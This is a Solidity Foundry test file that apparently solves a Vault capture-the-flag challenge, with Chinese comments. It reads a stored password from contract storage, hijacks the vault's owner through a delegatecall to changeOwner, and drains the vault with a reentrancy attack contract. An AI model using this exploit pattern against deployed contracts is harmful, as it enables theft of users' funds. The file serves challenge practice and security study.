// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

// 攻击合约
contract doubleEnter {
    address payable public vault;
    address payable public owner;

    constructor(address _vault) payable {
        vault = payable(_vault);
        owner = payable(msg.sender);
    }

    function attack() public {
        Vault(vault).deposite{value: 0.1 ether}();
        Vault(vault).withdraw();
    }

    receive() external payable {
        Vault(vault).withdraw();
    }

    function ownerWithdraw() public {
        owner.transfer(address(this).balance);
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 1. 读取logic合约slot1（password）---------------------------------------
        bytes32 password = vm.load(address(logic), bytes32(uint256(1)));
        // 2. 读取Vault合约slot1（logic地址）
        bytes32 logicAddr = vm.load(address(vault), bytes32(uint256(1)));
        // 3. 劫持owner
        bytes4 selector = VaultLogic.changeOwner.selector;
        bytes memory data = abi.encodeWithSelector(
            selector,
            logicAddr,
            palyer
        );
        (bool ok, ) = address(vault).call(data);
        require(vault.owner() == palyer, "owner not hijacked");
        // 4. 开启提现
        vault.openWithdraw();
        // 5. palyer自己先存一笔钱
        vault.deposite{value: 0.1 ether}();

        // 6. palyer利用doubleEnter合约来做重入攻击
        // 部署攻击合约并发送0.1eth
        doubleEnter de = (new doubleEnter){value: 0.1 ether}(address(vault));
        // 发动重入攻击
        de.attack();
        // 提现到palyer
        de.ownerWithdraw();
        // 断言Vault被清空，palyer收到钱
        assertEq(address(vault).balance, 0);
        assertEq(palyer.balance, 1.1 ether);
        // --------------------------  结 束  ---------------------------------------

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
